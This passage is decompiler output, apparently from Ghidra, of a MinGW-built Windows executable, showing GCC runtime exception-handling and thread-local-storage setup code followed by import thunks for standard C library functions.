    PTR_PTR_FUN_004230e0 = PTR_PTR_FUN_004230e0 + 4;
    iVar2 = *piVar1;
  }
  return;
}



void FUN_004215b0(void)

{
  int iVar1;
  bool bVar2;
  
  if (DAT_0042c1c0 == 0) {
    DAT_0042c1c0 = 1;
    iVar1 = 0;
    bVar2 = false;
    while (!bVar2) {
      iVar1 = iVar1 + 1;
      bVar2 = (&PTR_LAB_00422e34)[iVar1] == (undefined *)0x0;
    }
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*(code *)(&DAT_00422e30)[iVar1])();
    }
    FUN_00401260();
  }
  return;
}



int * FUN_00421630(void)

{
  ATOM in_AX;
  UINT UVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  char *pcVar6;
  CHAR local_5c [84];
  
  piVar4 = (int *)0x0;
  UVar1 = GetAtomNameA(in_AX,local_5c,0x42);
  iVar3 = 0x1f;
  uVar2 = 1;
  if (UVar1 == 0) goto LAB_004216ae;
  do {
    while (local_5c[iVar3] != 'A') {
      uVar2 = uVar2 * 2;
      iVar3 = iVar3 + -1;
      if (iVar3 < 0) goto LAB_0042167b;
    }
    piVar4 = (int *)((uint)piVar4 | uVar2);
    uVar2 = uVar2 * 2;
    iVar3 = iVar3 + -1;
  } while (-1 < iVar3);
LAB_0042167b:
  if (*piVar4 != 0x3c) {
    pcVar6 = "w32_sharedptr->size == sizeof(W32_EH_SHARED)";
    uVar5 = 0xea;
    do {
      FUN_00422720("%s:%u: failed assertion `%s\'\n","../../gcc/gcc/config/i386/w32-shared-ptr.c",
                   uVar5,pcVar6);
LAB_004216ae:
      pcVar6 = "GetAtomNameA (atom, s, sizeof(s)) != 0";
      uVar5 = 0xe4;
    } while( true );
  }
  return piVar4;
}



void FUN_004216d0(void)

{
  uint uVar1;
  ATOM AVar2;
  uint *_Memory;
  uint uVar3;
  uint *puVar4;
  int iVar5;
  uint uVar6;
  CHAR local_bc [32];
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined2 local_7c;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined2 local_2c;
  
  if (DAT_0042c210 != (uint *)0x0) {
    return;
  }
  local_6c = 0x41414141;
  local_68 = 0x41414141;
  local_64 = 0x41414141;
  local_4c._0_1_ = '-';
  local_4c._1_1_ = 'L';
  local_4c._2_1_ = 'I';
  local_4c._3_1_ = 'B';
  local_60 = 0x41414141;
  local_5c = 0x41414141;
  local_48._0_1_ = 'G';
  local_48._1_1_ = 'C';
  local_48._2_1_ = 'C';
  local_48._3_1_ = 'W';
  local_58 = 0x41414141;
  local_54 = 0x41414141;
  local_44._0_1_ = '3';
  local_44._1_1_ = '2';
  local_44._2_1_ = '-';
  local_44._3_1_ = 'E';
  local_50 = 0x41414141;
  local_40._0_1_ = 'H';
  local_40._1_1_ = '-';
  local_40._2_1_ = '2';
  local_40._3_1_ = '-';
  local_3c._0_1_ = 'S';
  local_3c._1_1_ = 'J';
  local_3c._2_1_ = 'L';
  local_3c._3_1_ = 'J';
  local_38._0_1_ = '-';
  local_38._1_1_ = 'G';
  local_38._2_1_ = 'T';
  local_38._3_1_ = 'H';
  local_34._0_1_ = 'R';
  local_34._1_1_ = '-';
  local_34._2_1_ = 'M';
  local_34._3_1_ = 'I';
  local_30._0_1_ = 'N';
  local_30._1_1_ = 'G';
  local_30._2_1_ = 'W';
  local_30._3_1_ = '3';
  local_2c = 0x32;
  AVar2 = FindAtomA((LPCSTR)&local_6c);
  if (AVar2 == 0) {
    _Memory = (uint *)malloc(0x3c);
    if (_Memory == (uint *)0x0) {
                    // WARNING: Subroutine does not return
      abort();
    }
    puVar4 = _Memory;
    for (iVar5 = 0xf; iVar5 != 0; iVar5 = iVar5 + -1) {
      *puVar4 = (uint)AVar2;
      puVar4 = puVar4 + 1;
    }
    _Memory[1] = (uint)abort;
    uVar6 = 1;
    _Memory[2] = (uint)&LAB_00421620;
    uVar3 = DAT_0042c1e0;
    *_Memory = 0x3c;
    uVar1 = DAT_0042c1e4;
    _Memory[10] = 0;
    _Memory[5] = uVar3;
    uVar3 = DAT_004230f0;
    _Memory[6] = uVar1;
    uVar1 = DAT_004230f4;
    _Memory[7] = uVar3;
    uVar3 = DAT_0042c1f0;
    _Memory[8] = uVar1;
    _Memory[0xc] = 0xffffffff;
    _Memory[0xb] = uVar3;
    uVar3 = DAT_004230f8;
    _Memory[0xe] = DAT_004230fc;
    iVar5 = 0x1f;
    _Memory[0xd] = uVar3;
    do {
      uVar3 = (uint)_Memory & uVar6;
      uVar6 = uVar6 * 2;
      local_bc[iVar5] = (-(uVar3 == 0) & 0x20U) + 0x41;
      iVar5 = iVar5 + -1;
    } while (-1 < iVar5);
    local_9c._0_1_ = '-';
    local_9c._1_1_ = 'L';
    local_9c._2_1_ = 'I';
    local_9c._3_1_ = 'B';
    local_98._0_1_ = 'G';
    local_98._1_1_ = 'C';
    local_98._2_1_ = 'C';
    local_98._3_1_ = 'W';
    local_94._0_1_ = '3';
    local_94._1_1_ = '2';
    local_94._2_1_ = '-';
    local_94._3_1_ = 'E';
    local_90._0_1_ = 'H';
    local_90._1_1_ = '-';
    local_90._2_1_ = '2';
    local_90._3_1_ = '-';
    local_8c._0_1_ = 'S';
    local_8c._1_1_ = 'J';
    local_8c._2_1_ = 'L';
    local_8c._3_1_ = 'J';
    local_88._0_1_ = '-';
    local_88._1_1_ = 'G';
    local_88._2_1_ = 'T';
    local_88._3_1_ = 'H';
    local_84._0_1_ = 'R';
    local_84._1_1_ = '-';
    local_84._2_1_ = 'M';
    local_84._3_1_ = 'I';
    local_80._0_1_ = 'N';
    local_80._1_1_ = 'G';
    local_80._2_1_ = 'W';
    local_80._3_1_ = '3';
    local_7c = 0x32;
    AVar2 = AddAtomA(local_bc);
    if ((AVar2 == 0) || (puVar4 = (uint *)FUN_00421630(), puVar4 != _Memory)) {
      AVar2 = 0;
    }
    if (AVar2 != 0) goto LAB_004218d3;
    free(_Memory);
    FindAtomA((LPCSTR)&local_6c);
  }
  _Memory = (uint *)FUN_00421630();
LAB_004218d3:
  DAT_0042c210 = _Memory;
  DAT_0042c200 = _Memory + 1;
  DAT_0042c220 = _Memory + 2;
  return;
}



void FUN_00421910(void)

{
  uint in_EAX;
  undefined4 *puVar1;
  code *UNRECOVERED_JUMPTABLE;
  
  puVar1 = (undefined4 *)&stack0x00000004;
  for (; 0xfff < in_EAX; in_EAX = in_EAX - 0x1000) {
    puVar1 = puVar1 + -0x400;
    *puVar1 = *puVar1;
  }
  *(undefined4 *)((int)puVar1 - in_EAX) = *(undefined4 *)((int)puVar1 - in_EAX);
                    // WARNING: Could not recover jumptable at 0x0042193b. Too many branches
                    // WARNING: Treating indirect jump as call
  (*UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_00421940(void)

{
  int iVar1;
  DWORD DVar2;
  int iVar3;
  
  iVar1 = DAT_0042c210;
  DVar2 = TlsAlloc();
  if (DVar2 != 0xffffffff) {
    *(DWORD *)(iVar1 + 0x2c) = DVar2;
    iVar3 = FUN_004214b0();
    *(uint *)(iVar1 + 0x30) = (uint)(iVar3 == 0);
    return;
  }
  DVar2 = GetLastError();
  *(uint *)(iVar1 + 0x30) = (uint)(DVar2 == 0);
  return;
}



void FUN_004219a0(void)

{
  int *piVar1;
  int iVar2;
  LONG LVar3;
  
  iVar2 = DAT_0042c210;
  piVar1 = (int *)(DAT_0042c210 + 0x34);
  if ((DAT_0042c1b0 != 0) && (piVar1 != (int *)0x0)) {
    if (*(int *)(DAT_0042c210 + 0x34) == 0) {
      LVar3 = InterlockedIncrement((LONG *)(DAT_0042c210 + 0x38));
      if (LVar3 == 0) {
        FUN_00421940();
        *(undefined4 *)(iVar2 + 0x34) = 1;
      }
      else {
        iVar2 = *(int *)(iVar2 + 0x34);
        while (iVar2 == 0) {
          Sleep(0);
          iVar2 = *piVar1;
        }
      }
    }
    if (-1 < *(int *)(DAT_0042c210 + 0x30)) {
      return;
    }
  }
  *(undefined4 *)(DAT_0042c210 + 0x30) = 0;
  return;
}



void __cdecl FUN_00421a50(LPVOID *param_1)

{
  int iVar1;
  DWORD dwTlsIndex;
  int iVar2;
  DWORD dwErrCode;
  LPVOID pvVar3;
  BOOL BVar4;
  
  if (DAT_0042c210 == 0) {
    FUN_004216d0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar1 < 0) {
    FUN_004219a0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
    iVar2 = DAT_0042c210;
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
    iVar2 = DAT_0042c210;
  }
  DAT_0042c210 = iVar2;
  if (iVar1 == 0) {
    *param_1 = *(LPVOID *)(iVar2 + 0x28);
    *(LPVOID **)(iVar2 + 0x28) = param_1;
  }
  else {
    dwTlsIndex = *(DWORD *)(iVar2 + 0x2c);
    dwErrCode = GetLastError();
    pvVar3 = TlsGetValue(dwTlsIndex);
    SetLastError(dwErrCode);
    *param_1 = pvVar3;
    BVar4 = TlsSetValue(*(DWORD *)(DAT_0042c210 + 0x2c),param_1);
    if (BVar4 == 0) {
                    // WARNING: Could not recover jumptable at 0x00421b29. Too many branches
                    // WARNING: Treating indirect jump as call
      GetLastError();
      return;
    }
  }
  return;
}



void __cdecl FUN_00421b30(LPVOID *param_1)

{
  LPVOID lpTlsValue;
  int iVar1;
  BOOL BVar2;
  
  lpTlsValue = *param_1;
  if (DAT_0042c210 == 0) {
    FUN_004216d0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar1 < 0) {
    FUN_004219a0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar1 == 0) {
    *(LPVOID *)(DAT_0042c210 + 0x28) = lpTlsValue;
  }
  else {
    BVar2 = TlsSetValue(*(DWORD *)(DAT_0042c210 + 0x2c),lpTlsValue);
    if (BVar2 == 0) {
                    // WARNING: Could not recover jumptable at 0x00421bc1. Too many branches
                    // WARNING: Treating indirect jump as call
      GetLastError();
      return;
    }
  }
  return;
}



undefined4 FUN_00421c60(void)

{
  return 0;
}



undefined4 FUN_00421c80(void)

{
  return 0;
}



undefined4 FUN_00421c90(void)

{
  return 0;
}



undefined4 __fastcall FUN_00421ca0(undefined4 param_1,int **param_2)

{
  int *piVar1;
  undefined4 *in_EAX;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  
  piVar2 = *param_2;
  do {
    pcVar3 = (code *)0x0;
    iVar4 = 5;
    if (piVar2 != (int *)0x0) {
      pcVar3 = (code *)piVar2[6];
      iVar4 = 0;
    }
    piVar1 = (int *)in_EAX[4];
    if (iVar4 != 0) {
      return 2;
    }
    if (pcVar3 != (code *)0x0) {
      iVar4 = (*pcVar3)(1,(uint)(piVar2 == piVar1) << 2 | 2,*in_EAX,in_EAX[1]);
      if (iVar4 == 7) {
        return 7;
      }
      if (iVar4 != 8) {
        return 2;
      }
    }
    if ((piVar2 == piVar1) != 0) {
                    // WARNING: Subroutine does not return
      abort();
    }
    piVar2 = (int *)**param_2;
    *param_2 = piVar2;
  } while( true );
}



int __cdecl FUN_00421d30(undefined4 *param_1)

{
  DWORD dwTlsIndex;
  DWORD dwErrCode;
  int **ppiVar1;
  BOOL BVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  int iVar4;
  int **local_18;
  int **local_14;
  
  if (DAT_0042c210 == 0) {
    FUN_004216d0();
    iVar4 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar4 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar4 < 0) {
    FUN_004219a0();
  }
  if (*(int *)(DAT_0042c210 + 0x30) == 0) {
    ppiVar1 = *(int ***)(DAT_0042c210 + 0x28);
  }
  else {
    dwTlsIndex = *(DWORD *)(DAT_0042c210 + 0x2c);
    dwErrCode = GetLastError();
    ppiVar1 = (int **)TlsGetValue(dwTlsIndex);
    SetLastError(dwErrCode);
  }
  local_14 = ppiVar1;
  do {
    piVar3 = (int *)0x0;
    iVar4 = 5;
    if (ppiVar1 != (int **)0x0) {
      piVar3 = ppiVar1[6];
      iVar4 = 0;
    }
    if (iVar4 == 5) {
      return 5;
    }
    if (iVar4 != 0) {
      return 3;
    }
    local_18 = ppiVar1;
    if (piVar3 != (int *)0x0) {
      iVar4 = (*(code *)piVar3)(1,1,*param_1,param_1[1],param_1,&local_18);
      if (iVar4 == 6) {
        param_1[3] = 0;
        param_1[4] = local_18;
        local_18 = local_14;
        iVar4 = FUN_00421ca0(extraout_ECX,(int **)&local_18);
        ppiVar1 = local_18;
        if (iVar4 == 7) {
          if (DAT_0042c210 == 0) {
            FUN_004216d0();
          }
          if (*(int *)(DAT_0042c210 + 0x30) < 0) {
            FUN_004219a0();
          }
          if (*(int *)(DAT_0042c210 + 0x30) == 0) {
            *(int ***)(DAT_0042c210 + 0x28) = ppiVar1;
          }
          else {
            BVar2 = TlsSetValue(*(DWORD *)(DAT_0042c210 + 0x2c),ppiVar1);
            if (BVar2 == 0) {
              GetLastError();
            }
          }
                    // WARNING: Could not recover jumptable at 0x00421e81. Too many branches
                    // WARNING: Treating indirect jump as call
          iVar4 = (*(code *)local_18[9])();
          return iVar4;
        }
        return iVar4;
      }
      if (iVar4 != 8) {
        return 3;
      }
    }
    ppiVar1 = (int **)*local_18;
  } while( true );
}



undefined4 __fastcall FUN_00421ec0(undefined4 param_1,int **param_2)

{
  code *pcVar1;
  undefined4 *in_EAX;
  int *piVar2;
  int iVar3;
  int iVar4;
  code *local_1c;
  
  pcVar1 = (code *)in_EAX[3];
  piVar2 = *param_2;
  while( true ) {
    local_1c = (code *)0x0;
    iVar4 = 5;
    if (piVar2 != (int *)0x0) {
      local_1c = (code *)piVar2[6];
      iVar4 = 0;
    }
    if (iVar4 != 0 && iVar4 != 5) {
      return 2;
    }
    iVar3 = (*pcVar1)(1,((iVar4 == 5) - 1 & 0xfffffff0) + 0x1a,*in_EAX,in_EAX[1]);
    if (iVar3 != 0) {
      return 2;
    }
    if (iVar4 == 5) break;
    if (local_1c != (code *)0x0) {
      iVar4 = (*local_1c)(1,10,*in_EAX,in_EAX[1]);
      if (iVar4 == 7) {
        return 7;
      }
      if (iVar4 != 8) {
        return 2;
      }
    }
    piVar2 = (int *)**param_2;
    *param_2 = piVar2;
  }
  return 5;
}



// WARNING: Type propagation algorithm not settling

void FUN_00422110(int param_1)

{
  DWORD dwTlsIndex;
  int iVar1;
  DWORD dwErrCode;
  int *piVar2;
  BOOL BVar3;
  int *local_18;
  int *local_14;
  
  if (DAT_0042c210 == 0) {
    FUN_004216d0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar1 < 0) {
    FUN_004219a0();
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  else {
    iVar1 = *(int *)(DAT_0042c210 + 0x30);
  }
  if (iVar1 == 0) {
    piVar2 = *(int **)(DAT_0042c210 + 0x28);
  }
  else {
    dwTlsIndex = *(DWORD *)(DAT_0042c210 + 0x2c);
    dwErrCode = GetLastError();
    piVar2 = (int *)TlsGetValue(dwTlsIndex);
    SetLastError(dwErrCode);
  }
  local_18 = piVar2;
  local_14 = piVar2;
  if (*(int *)(param_1 + 0xc) == 0) {
    iVar1 = FUN_00421ca0(0,&local_18);
  }
  else {
    iVar1 = FUN_00421ec0(*(int *)(param_1 + 0xc),&local_18);
  }
  piVar2 = local_18;
  if (iVar1 == 7) {
    if (DAT_0042c210 == 0) {
      FUN_004216d0();
      iVar1 = *(int *)(DAT_0042c210 + 0x30);
    }
    else {
      iVar1 = *(int *)(DAT_0042c210 + 0x30);
    }
    if (iVar1 < 0) {
      FUN_004219a0();
    }
    if (*(int *)(DAT_0042c210 + 0x30) == 0) {
      *(int **)(DAT_0042c210 + 0x28) = piVar2;
    }
    else {
      BVar3 = TlsSetValue(*(DWORD *)(DAT_0042c210 + 0x2c),piVar2);
      if (BVar3 == 0) {
        GetLastError();
      }
    }
                    // WARNING: Could not recover jumptable at 0x00422196. Too many branches
                    // WARNING: Treating indirect jump as call
    (*(code *)local_18[9])();
    return;
  }
                    // WARNING: Subroutine does not return
  abort();
}



void __cdecl FUN_00422270(undefined4 *param_1)

{
  DWORD dwTlsIndex;
  int iVar1;
  DWORD dwErrCode;
  int *piVar2;
  BOOL BVar3;
  undefined4 uVar4;
  undefined4 extraout_ECX;
  int *local_18;
  int *local_14;
  
  if (param_1[3] == 0) {
    FUN_00421d30(param_1);
    return;
  }
  if (DAT_0042c210 == 0) {
    FUN_004216d0();
  }
  if (*(int *)(DAT_0042c210 + 0x30) < 0) {
    FUN_004219a0();
  }
  if (*(int *)(DAT_0042c210 + 0x30) == 0) {
    piVar2 = *(int **)(DAT_0042c210 + 0x28);
    uVar4 = 0;
  }
  else {
    dwTlsIndex = *(DWORD *)(DAT_0042c210 + 0x2c);
    dwErrCode = GetLastError();
    piVar2 = (int *)TlsGetValue(dwTlsIndex);
    SetLastError(dwErrCode);
    uVar4 = extraout_ECX;
  }
  local_18 = piVar2;
  local_14 = piVar2;
  iVar1 = FUN_00421ec0(uVar4,&local_18);
  piVar2 = local_18;
  if (iVar1 == 7) {
    if (DAT_0042c210 == 0) {
      FUN_004216d0();
    }
    if (*(int *)(DAT_0042c210 + 0x30) < 0) {
      FUN_004219a0();
    }
    if (*(int *)(DAT_0042c210 + 0x30) == 0) {
      *(int **)(DAT_0042c210 + 0x28) = piVar2;
    }
    else {
      BVar3 = TlsSetValue(*(DWORD *)(DAT_0042c210 + 0x2c),piVar2);
      if (BVar3 == 0) {
        GetLastError();
      }
    }
                    // WARNING: Could not recover jumptable at 0x004222f4. Too many branches
                    // WARNING: Treating indirect jump as call
    (*(code *)local_18[9])();
    return;
  }
                    // WARNING: Subroutine does not return
  abort();
}



void __cdecl FUN_004223a0(int param_1)

{
  if (*(code **)(param_1 + 8) == (code *)0x0) {
    return;
  }
  (**(code **)(param_1 + 8))(1,param_1);
  return;
}



undefined4 __cdecl FUN_004224c0(int *param_1,undefined *param_2)

{
  int iVar1;
  LONG LVar2;
  undefined4 uVar3;
  
  uVar3 = 0x16;
  if (param_1 != (int *)0x0 && param_2 != (undefined *)0x0) {
    if (*param_1 == 0) {
      LVar2 = InterlockedIncrement(param_1 + 1);
      if (LVar2 == 0) {
        (*(code *)param_2)();
        *param_1 = 1;
      }
      else {
        iVar1 = *param_1;
        while (iVar1 == 0) {
          Sleep(0);
          iVar1 = *param_1;
        }
      }
    }
    uVar3 = 0;
  }
  return uVar3;
}



void __cdecl FUN_00422630(undefined4 *param_1)

{
  HANDLE pvVar1;
  
  *param_1 = 0xffffffff;
  pvVar1 = CreateSemaphoreA((LPSECURITY_ATTRIBUTES)0x0,0,0xffff,(LPCSTR)0x0);
  param_1[1] = pvVar1;
  return;
}



undefined4 __cdecl FUN_00422670(LONG *param_1)

{
  LONG LVar1;
  DWORD DVar2;
  
  LVar1 = InterlockedIncrement(param_1);
  if (LVar1 != 0) {
    DVar2 = WaitForSingleObject((HANDLE)param_1[1],0xffffffff);
    if (DVar2 != 0) {
      InterlockedDecrement(param_1);
      return 1;
    }
  }
  return 0;
}



bool __cdecl FUN_004226d0(LONG *param_1)

{
  LONG LVar1;
  BOOL BVar2;
  bool bVar3;
  
  LVar1 = InterlockedDecrement(param_1);
  bVar3 = false;
  if (-1 < LVar1) {
    BVar2 = ReleaseSemaphore((HANDLE)param_1[1],1,(LPLONG)0x0);
    bVar3 = BVar2 == 0;
  }
  return bVar3;
}



void FUN_00422720(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  fprintf((FILE *)(_iob_exref + 0x40),param_1,param_2,param_3,param_4);
  fflush((FILE *)(_iob_exref + 0x40));
                    // WARNING: Subroutine does not return
  abort();
}



int __cdecl _mkdir(char *_Path)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422770. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _mkdir(_Path);
  return iVar1;
}



void __cdecl _cexit(void)

{
                    // WARNING: Could not recover jumptable at 0x00422790. Too many branches
                    // WARNING: Treating indirect jump as call
  _cexit();
  return;
}



void __p__environ(void)

{
                    // WARNING: Could not recover jumptable at 0x004227a0. Too many branches
                    // WARNING: Treating indirect jump as call
  __p__environ();
  return;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

void signal(int param_1)

{
                    // WARNING: Could not recover jumptable at 0x004227b0. Too many branches
                    // WARNING: Treating indirect jump as call
  signal(param_1);
  return;
}



void __p__fmode(void)

{
                    // WARNING: Could not recover jumptable at 0x004227c0. Too many branches
                    // WARNING: Treating indirect jump as call
  __p__fmode();
  return;
}



int __cdecl _setmode(int _FileHandle,int _Mode)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004227d0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _setmode(_FileHandle,_Mode);
  return iVar1;
}



int __cdecl
__getmainargs(int *_Argc,char ***_Argv,char ***_Env,int _DoWildCard,_startupinfo *_StartInfo)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004227e0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = __getmainargs(_Argc,_Argv,_Env,_DoWildCard,_StartInfo);
  return iVar1;
}



int __cdecl _findclose(intptr_t _FindHandle)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004227f0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _findclose(_FindHandle);
  return iVar1;
}



void _findnext(void)

{
                    // WARNING: Could not recover jumptable at 0x00422800. Too many branches
                    // WARNING: Treating indirect jump as call
  _findnext();
  return;
}



int __cdecl strcmp(char *_Str1,char *_Str2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422810. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp(_Str1,_Str2);
  return iVar1;
}



void _findfirst(void)

{
                    // WARNING: Could not recover jumptable at 0x00422820. Too many branches
                    // WARNING: Treating indirect jump as call
  _findfirst();
  return;
}



char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422830. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcpy(_Dest,_Source);
  return pcVar1;
}



char * __cdecl getenv(char *_VarName)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422840. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = getenv(_VarName);
  return pcVar1;
}



void __cdecl exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x00422850. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  exit(_Code);
  return;
}



int __cdecl remove(char *_Filename)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422860. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = remove(_Filename);
  return iVar1;
}



double __cdecl atof(char *_String)

{
  double dVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422870. Too many branches
                    // WARNING: Treating indirect jump as call
  dVar1 = atof(_String);
  return dVar1;
}



int __cdecl sscanf(char *_Src,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422880. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sscanf(_Src,_Format);
  return iVar1;
}



int __cdecl fclose(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422890. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fclose(_File);
  return iVar1;
}



int __cdecl fprintf(FILE *_File,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228a0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fprintf(_File,_Format);
  return iVar1;
}



int __cdecl sprintf(char *_Dest,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sprintf(_Dest,_Format);
  return iVar1;
}



size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228c0. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen(_Str);
  return sVar1;
}



void * __cdecl memmove(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228d0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memmove(_Dst,_Src,_Size);
  return pvVar1;
}



char * __cdecl strstr(char *_Str,char *_SubStr)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228e0. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strstr(_Str,_SubStr);
  return pcVar1;
}



FILE * __cdecl fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x004228f0. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = fopen(_Filename,_Mode);
  return pFVar1;
}



time_t __cdecl time(time_t *_Time)

{
  time_t tVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422900. Too many branches
                    // WARNING: Treating indirect jump as call
  tVar1 = time(_Time);
  return tVar1;
}



void __cdecl srand(uint _Seed)

{
                    // WARNING: Could not recover jumptable at 0x00422910. Too many branches
                    // WARNING: Treating indirect jump as call
  srand(_Seed);
  return;
}



int __cdecl rand(void)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422920. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = rand();
  return iVar1;
}



void __cdecl _splitpath(char *_FullPath,char *_Drive,char *_Dir,char *_Filename,char *_Ext)

{
                    // WARNING: Could not recover jumptable at 0x00422930. Too many branches
                    // WARNING: Treating indirect jump as call
  _splitpath(_FullPath,_Drive,_Dir,_Filename,_Ext);
  return;
}



char * __cdecl strcat(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422940. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcat(_Dest,_Source);
  return pcVar1;
}



void __p___argv(void)

{
                    // WARNING: Could not recover jumptable at 0x00422950. Too many branches
                    // WARNING: Treating indirect jump as call
  __p___argv();
  return;
}



void __p___argc(void)

{
                    // WARNING: Could not recover jumptable at 0x00422960. Too many branches
                    // WARNING: Treating indirect jump as call
  __p___argc();
  return;
}



size_t __cdecl fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422970. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = fwrite(_Str,_Size,_Count,_File);
  return sVar1;
}



int __cdecl fseek(FILE *_File,long _Offset,int _Origin)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422980. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fseek(_File,_Offset,_Origin);
  return iVar1;
}



int __cdecl fscanf(FILE *_File,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422990. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fscanf(_File,_Format);
  return iVar1;
}



int __cdecl atoi(char *_Str)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004229a0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = atoi(_Str);
  return iVar1;
}



int __cdecl fgetc(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004229b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fgetc(_File);
  return iVar1;
}



long __cdecl ftell(FILE *_File)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x004229c0. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = ftell(_File);
  return lVar1;
}



size_t __cdecl fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004229d0. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = fread(_DstBuf,_ElementSize,_Count,_File);
  return sVar1;
}



void * __cdecl realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004229e0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = realloc(_Memory,_NewSize);
  return pvVar1;
}



void __cdecl free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x004229f0. Too many branches
                    // WARNING: Treating indirect jump as call
  free(_Memory);
  return;
}



void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a00. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = malloc(_Size);
  return pvVar1;
}



int __cdecl fputc(int _Ch,FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a10. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fputc(_Ch,_File);
  return iVar1;
}



int __cdecl fflush(FILE *_File)

{
  int iVar1;
